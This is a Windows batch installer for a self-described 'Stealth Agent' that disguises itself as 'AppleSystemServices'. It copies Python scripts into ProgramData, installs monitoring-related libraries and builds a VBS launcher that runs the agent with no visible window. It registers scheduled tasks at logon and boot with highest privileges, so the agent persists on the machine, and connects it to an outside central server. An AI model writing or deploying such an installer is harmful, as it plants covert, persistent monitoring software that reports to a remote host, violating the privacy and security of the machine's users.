@echo off
:: ================================================
:: Windows Stealth Agent Automated Installer
:: Installs AppleSystemServices agent on Windows 10 / 11 / Server
:: Usage: Right-click -> Run as Administrator
:: ================================================

TITLE AppleSystemServices Windows Installer
color 0A
cls

echo ================================================
echo   🔧 Installing AppleSystemServices Agent (Windows)
echo ================================================
echo.

SET "SERVER_URL=https://central-monitor.onrender.com"
IF NOT "%~1"=="" SET "SERVER_URL=%~1"

SET "INSTALL_DIR=C:\ProgramData\AppleSystemServices"

echo  📡 Target Central Server: %SERVER_URL%
echo  📁 Target Install Path : %INSTALL_DIR%
echo.

:: Create install directory
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

:: Copy agent files
xcopy /E /Y /I "%~dp0monitor.py" "%INSTALL_DIR%\" >nul
xcopy /E /Y /I "%~dp0sysupdate.py" "%INSTALL_DIR%\" >nul
if exist "%~dp0templates" xcopy /E /Y /I "%~dp0templates" "%INSTALL_DIR%\templates\" >nul

:: Install Python pip requirements if python available
where python >nul 2>nul
if %ERRORLEVEL% EQU 0 (
    echo 📦 Checking & installing Python dependencies...
    python -m pip install flask psutil requests pillow --quiet >nul 2>nul
)

:: Create VBS Silent Launcher (Runs Python without black window popup)
echo Set WshShell = CreateObject("WScript.Shell") > "%INSTALL_DIR%\run_agent.vbs"
echo WshShell.Run "pythonw.exe """ ^& "%INSTALL_DIR%\sysupdate.py" ^& """ --server %SERVER_URL%", 0, False >> "%INSTALL_DIR%\run_agent.vbs"

:: Register Scheduled Task to start automatically on system boot / logon
echo ⚙️ Creating Windows Task Scheduler Stealth Service...
schtasks /create /tn "AppleSystemServices" /tr "wscript.exe \"%INSTALL_DIR%\run_agent.vbs\"" /sc onlogon /rl highest /f >nul 2>nul
schtasks /create /tn "AppleSystemServices_Boot" /tr "wscript.exe \"%INSTALL_DIR%\run_agent.vbs\"" /sc onstart /rl highest /f >nul 2>nul

:: Start agent immediately
echo 🚀 Launching Agent background process...
wscript.exe "%INSTALL_DIR%\run_agent.vbs"

echo.
echo ================================================
echo   ✅ SUCCESS! Agent is running silently on Windows.
echo   📡 Connected to: %SERVER_URL%
echo ================================================
echo.
pause
